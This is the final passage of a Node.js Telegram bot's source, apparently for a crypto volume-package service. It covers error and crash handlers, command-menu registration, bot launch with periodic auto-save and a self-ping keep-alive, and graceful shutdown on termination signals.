    process.on('unhandledRejection', (reason) => {
        const msg = reason?.message || String(reason);
        // Silently swallow expected Telegram API errors
        if (msg.includes('400:') || msg.includes('403:') || msg.includes('ECONNRESET')) {
            console.warn('⚠️  Swallowed unhandled rejection:', msg);
        } else {
            console.error('❌ Unhandled rejection:', reason);
            // Save data so nothing is lost before a potential crash
            saveDataSync();
        }
    });

    // Save data on any uncaught exception before the process dies
    process.on('uncaughtException', (err) => {
        console.error('💥 Uncaught exception:', err.message, err.stack);
        saveDataSync();
        process.exit(1);
    });

    // Error handler
    bot.catch((err, ctx) => {
        console.error(`❌ Bot error for ${ctx.updateType}:`, err);
        
        // Try to send error message to user
        try {
            ctx.reply(
                `⚠️ **Oops! Something went wrong.**\n\n` +
                `Please try again or use the 📞 Contact Support button if the problem persists.`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.error('Failed to send error message to user:', e);
        }
    });

    // Start the bot
    console.log('🤖 Bot starting...');

    // Register quick commands in Telegram's command menu
    bot.telegram.setMyCommands([
        { command: 'start',   description: '🏠 Open main menu' },
        { command: 'volume',  description: '📊 View all volume packages & pricing' },
        { command: 'help',    description: 'ℹ️ Help guide & all commands' },
        { command: 'cancel',  description: '❌ Cancel current session & return to menu' },
        { command: 'chains',  description: '🌐 Supported chains & live prices' },
        { command: 'setlang', description: '🌐 Change language (e.g. /setlang es)' },
    ]).catch(e => console.error('Failed to set commands:', e));

    bot.launch()
        .then(() => {
            console.log('✅ Bot successfully started!');
            console.log(`📊 Loaded ${Object.keys(botData.users).length} users`);
            console.log(`💰 Loaded ${botData.userWallets.length} wallets`);
            console.log(`📋 Platform stats: ${botData.stats.totalOrders} orders, ${botData.stats.totalVolume} volume`);

            // Auto-save every 60 seconds as a safety net against crashes between user actions
            setInterval(saveData, 60 * 1000);
            console.log('🔁 Auto-save enabled (every 60s)');

            // Keep-alive: ping own URL every 14 min so Render free tier doesn't spin down
            const selfUrl = process.env.RENDER_EXTERNAL_URL;
            if (selfUrl) {
                console.log(`🔄 Keep-alive enabled → ${selfUrl}`);
                setInterval(() => {
                    const mod = selfUrl.startsWith('https') ? https : http;
                    mod.get(selfUrl, (res) => {
                        console.log(`🔄 Keep-alive ping: ${res.statusCode}`);
                    }).on('error', (err) => {
                        console.warn(`⚠️ Keep-alive ping failed: ${err.message}`);
                    });
                }, 14 * 60 * 1000);
            }
        })
        .catch((error) => {
            console.error('❌ Failed to start bot:', error);
            process.exit(1);
        });

    // ── Graceful shutdown — always persist data before the process exits ────────
    function gracefulShutdown(signal) {
        console.log(`🛑 Received ${signal} — saving data before exit...`);
        saveDataSync();
        bot.stop(signal);
        // Give Telegraf 2s to cleanly stop, then force-exit
        setTimeout(() => process.exit(0), 2000).unref();
    }

    process.once('SIGINT',  () => gracefulShutdown('SIGINT'));
    process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
}










